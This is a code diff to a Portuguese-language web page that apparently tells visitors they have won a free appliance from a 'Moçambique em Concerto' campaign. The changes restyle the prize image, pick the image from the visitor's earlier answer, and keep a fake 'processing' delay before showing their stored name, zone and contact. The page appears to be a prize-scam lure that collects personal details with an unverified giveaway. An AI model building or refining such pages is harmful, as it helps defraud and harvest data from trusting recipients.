@@ -58,8 +58,10 @@
     }
 
     .imagem-premio {
-      max-width: 100%;
-      border-radius: 10px;
+      width: 180px;
+      height: 180px;
+      border-radius: 12px;
+      object-fit: cover;
       margin-bottom: 20px;
       box-shadow: 0 0 15px #00ff8888;
     }
@@ -112,7 +114,7 @@
 
     <div class="resultado" id="resultado">
       <h1>🎉 Parabéns, <span id="nomeClienteSpan"></span>!</h1>
-      <img src="tv-smart.jpg" alt="Produto Ganhado" class="imagem-premio">
+      <img id="imagemPremio" src="" alt="Produto Ganhado" class="imagem-premio">
 
       <div class="mensagem">
         <p>Foste seleccionado pela campanha <strong>Moçambique em Concerto</strong> para receber <strong>um Electrodoméstico Gratuito</strong> (imagem acima), como parte da nossa distribuição nacional.</p>
@@ -133,17 +135,25 @@
   </div>
 
   <script>
-    // Recuperar dados do localStorage
+    // Obter dados do localStorage
     const nome = localStorage.getItem('nomeCliente') || "Cliente";
     const zona = localStorage.getItem('zonaCliente') || "Zona não definida";
     const contacto = localStorage.getItem('contactoCliente') || "Sem contacto";
+    const produto = localStorage.getItem('resposta3') || "";
 
-    // Preencher no HTML
+    // Mapear imagem do produto
+    let imagemSrc = "img/default.jpg";
+    if (produto === "Geleira") imagemSrc = "img/geleira.jpg";
+    else if (produto === "Congelador") imagemSrc = "img/congelador.jpg";
+    else if (produto.includes("TV")) imagemSrc = "img/tvsmart.jpg";
+
+    // Preencher dados
     document.getElementById('nomeClienteSpan').textContent = nome;
     document.getElementById('zonaClienteSpan').textContent = zona;
     document.getElementById('contactoClienteSpan').textContent = contacto;
+    document.getElementById('imagemPremio').src = imagemSrc;
 
-    // Mostrar resultado com atraso (efeito suspense)
+    // Mostrar resultado após 4s
     setTimeout(() => {
       document.querySelector('.processando').style.display = 'none';
       document.getElementById('resultado').style.display = 'block';
